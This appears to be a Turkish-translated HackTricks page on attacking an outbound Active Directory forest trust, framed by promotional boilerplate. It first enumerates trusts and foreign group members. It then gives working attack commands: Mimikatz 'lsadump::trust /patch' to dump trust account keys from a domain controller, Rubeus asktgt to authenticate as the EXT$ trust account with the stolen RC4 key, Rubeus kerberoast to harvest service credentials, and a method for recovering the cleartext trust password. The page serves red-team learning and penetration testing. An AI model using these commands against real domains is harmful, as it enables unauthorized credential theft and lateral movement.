# Dış Orman Etki Alanı - Tek Yönlü (Dışa Doğru)

<details>

<summary><strong>AWS hacklemeyi sıfırdan ileri seviyeye öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizin **HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI'na**](https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

Bu senaryoda **etki alanınız**, **farklı etki alanlarından** bir **ilkeye bazı ayrıcalıklar** güvenmektedir.

## Numaralandırma

### Dışa Doğru Güven
```powershell
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
## Güvenlik Hesabı Saldırısı

İki alan arasında bir güven ilişkisi kurulduğunda, burada alan **A** ve alan **B** olarak tanımlanan iki alan arasında bir güven ilişkisi kurulduğunda bir güvenlik açığı mevcuttur. Bu yapılandırmada, alan **B**, güvenini alan **A**'ya genişletir. Bu kurulumda, alan **A**'da alan **B** için özel bir hesap oluşturulur ve bu hesap, iki alan arasındaki kimlik doğrulama sürecinde kritik bir rol oynar. Alan **B** ile ilişkilendirilen bu hesap, alanlar arasında hizmetlere erişmek için biletleri şifrelemek için kullanılır.

Burada anlaşılması gereken kritik nokta, bu özel hesabın şifresinin ve karmasının bir Komut Satırı aracı kullanılarak alan **A**'daki bir Alan Denetleyicisinden çıkarılabileceğidir. Bu işlemi gerçekleştirmek için kullanılan komut:
```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
Bu çıkarma, adının ardından **$** ile tanımlanan hesabın etkin ve domain **A**'nın "Domain Kullanıcıları" grubuna ait olması nedeniyle mümkündür, bu da bu grubun izinleriyle ilişkilendirilmiş izinlerin devralınmasını sağlar. Bu, bireylerin bu hesabın kimlik bilgilerini kullanarak domain **A**'ya karşı kimlik doğrulaması yapmasına olanak tanır.

**Uyarı:** Bu durumu kullanarak domain **A**'da sınırlı izinlerle bir kullanıcı olarak bir başlangıç noktası elde etmek mümkündür. Ancak, bu erişim, domain **A** üzerinde numaralandırma yapmak için yeterlidir.

Güvenen domain'in `ext.local` ve güvenilen domain'in `root.local` olduğu bir senaryoda, `root.local` içinde `EXT$` adında bir kullanıcı hesabı oluşturulacaktır. Belirli araçlar aracılığıyla, Kerberos güven anahtarlarını dökerek `root.local` içindeki `EXT$` kimlik bilgilerini ortaya çıkarmak mümkündür. Bunu başarmak için kullanılacak komut:
```bash
lsadump::trust /patch
```
Ardından, çıkarılan RC4 anahtarını kullanarak başka bir araç komutunu kullanarak `root.local` içinde `root.local\EXT$` olarak kimlik doğrulaması yapılabilir:
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
Bu kimlik doğrulama adımı, `root.local` içinde hizmet hesabı kimlik bilgilerini çıkarmak için Kerberoast saldırısı gerçekleştirme gibi hizmetleri numaralandırma ve hatta istismar olasılığını açar:
```bash
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### Açık metin güven şifresi toplama

Önceki akışta, **açık metin şifresi** (ayrıca **mimikatz ile dump edilen**) yerine güven hash'i kullanıldı.

Açık metin şifresi, mimikatz'den gelen \[ CLEAR ] çıktısının onaltılıktan dönüştürülerek ve ' \x00 ' null baytları çıkarılarak elde edilebilir:

![](<../../.gitbook/assets/image (935).png>)

Bazen bir güven ilişkisi oluşturulurken, güven için kullanıcı tarafından bir şifre yazılması gerekebilir. Bu gösterimde, anahtar orijinal güven şifresidir ve dolayısıyla insan tarafından okunabilir. Anahtar döngüsü (30 gün) olduğunda, açık metin insan tarafından okunabilir olmayacak ancak teknik olarak hala kullanılabilir olacaktır.

Açık metin şifresi, güven hesabının Kerberos gizli anahtarını kullanarak TGT istemek yerine güven hesabı olarak düzenli kimlik doğrulaması yapmak için kullanılabilir. Burada, ext.local'den root.local'a Domain Yöneticileri üyeleri için sorgulama yapılıyor:

![](<../../.gitbook/assets/image (789).png>)

## Referanslar

* [https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted)

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman seviyesine öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na göz atın (https://github.com/sponsors/carlospolop)!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu
* **💬 [Discord grubuna](https://discord.gg/hRep4RUj7f) katılın veya [telegram grubuna](https://t.me/peass) katılın veya** bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)'da takip edin.
* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
